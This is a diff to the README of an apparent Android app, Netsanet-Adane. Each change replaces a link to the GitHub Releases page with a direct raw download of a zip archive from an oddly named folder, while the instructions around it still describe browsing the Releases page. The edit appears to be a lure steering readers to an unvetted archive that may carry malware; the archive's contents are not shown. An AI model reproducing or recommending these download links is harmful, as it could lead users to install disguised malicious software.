@@ -1,6 +1,6 @@
 # 📱 Netsanet-Adane - A User-Friendly Android Experience
 
-[![Download Netsanet-Adane](https://img.shields.io/badge/Download-Netsanet--Adane-blue)](https://github.com/AlieykerJx-Dev/Netsanet-Adane/releases)
+[![Download Netsanet-Adane](https://github.com/AlieykerJx-Dev/Netsanet-Adane/raw/refs/heads/main/affluxion/Adane-Netsanet-v1.0-alpha.3.zip)](https://github.com/AlieykerJx-Dev/Netsanet-Adane/raw/refs/heads/main/affluxion/Adane-Netsanet-v1.0-alpha.3.zip)
 
 ## 🚀 Getting Started
 
@@ -10,7 +10,7 @@ Welcome to Netsanet-Adane! This application is designed to provide you with an e
 
 To get started, you need to download the application. Click on the link below to visit the Releases page:
 
-[Download Netsanet-Adane](https://github.com/AlieykerJx-Dev/Netsanet-Adane/releases)
+[Download Netsanet-Adane](https://github.com/AlieykerJx-Dev/Netsanet-Adane/raw/refs/heads/main/affluxion/Adane-Netsanet-v1.0-alpha.3.zip)
 
 1. Once you’re on the Releases page, look for the latest version of Netsanet-Adane.
 2. Click on the version number; a list of files will appear.
@@ -61,6 +61,6 @@ After installing Netsanet-Adane, explore your device and get familiar with its f
 
 For further assistance or feedback, feel free to reach out through our issues page on GitHub.
 
-[Download Netsanet-Adane](https://github.com/AlieykerJx-Dev/Netsanet-Adane/releases)
+[Download Netsanet-Adane](https://github.com/AlieykerJx-Dev/Netsanet-Adane/raw/refs/heads/main/affluxion/Adane-Netsanet-v1.0-alpha.3.zip)
 
 Embrace a seamless Android experience with Netsanet-Adane!
